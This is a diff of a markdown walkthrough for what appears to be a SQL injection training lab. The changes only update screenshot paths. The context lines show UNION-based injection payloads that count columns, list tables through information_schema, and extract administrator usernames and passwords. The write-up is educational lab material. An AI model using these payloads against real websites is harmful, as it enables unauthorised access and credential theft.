@@ -32,7 +32,7 @@ category=Pets' ORDER BY 2--
 
 No error returned — confirmed query returns **2 columns**.
 
-![Step 1](images/01-order-by.png)
+![Step 1](../images/union-attacks/01-order-by.png)
 
 ---
 
@@ -58,7 +58,8 @@ category=Pets' UNION SELECT table_name,null FROM information_schema.tables--
 
 Found target table: **`users_mkiafm`**
 
-![Step 3](images/02-tables.png)
+![Step 3](../images/union-attacks/02-tables1.jpeg)
+![Step 3](../images/union-attacks/02-tables2.jpeg)
 
 ---
 
@@ -74,7 +75,7 @@ Found columns:
 - `username_lugdih`
 - `password_lrnrix`
 
-![Step 4](images/03-columns.png)
+![Step 4](../images/union-attacks/03-columns.jpeg)
 
 ---
 
@@ -88,9 +89,9 @@ category=Pets' UNION SELECT username_lugdih,password_lrnrix FROM users_mkiafm--
 
 Successfully retrieved administrator credentials and logged in.
 
-![Step 5](images/04-credentials.png)
+![Step 5](../images/union-attacks/04-credentials.jpeg)
 
-![Lab Solved](images/05-solved.png)
+![Lab Solved](../images/union-attacks/05-solved.jpeg)
 
 ---
 
